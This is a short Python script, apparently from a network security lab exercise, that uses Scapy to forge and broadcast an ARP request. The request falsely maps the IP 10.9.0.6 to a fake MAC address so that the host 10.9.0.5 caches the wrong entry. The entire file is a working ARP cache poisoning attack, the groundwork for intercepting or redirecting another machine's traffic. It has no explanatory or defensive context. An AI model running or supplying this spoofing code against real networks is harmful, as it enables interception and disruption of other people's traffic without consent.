#!/usr/bin/env python3
from scapy.all import *

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"
IP_T = "10.9.0.6"
MAC_T_fake ="02:42:0a:09:00:69"

ether = Ether(src = MAC_T_fake , dst = "ff:ff:ff:ff:ff:ff")
arp = ARP(psrc = IP_T, hwsrc = MAC_T_fake , pdst = IP_V)
arp.op = 1
frame = ether/arp
sendp(frame)
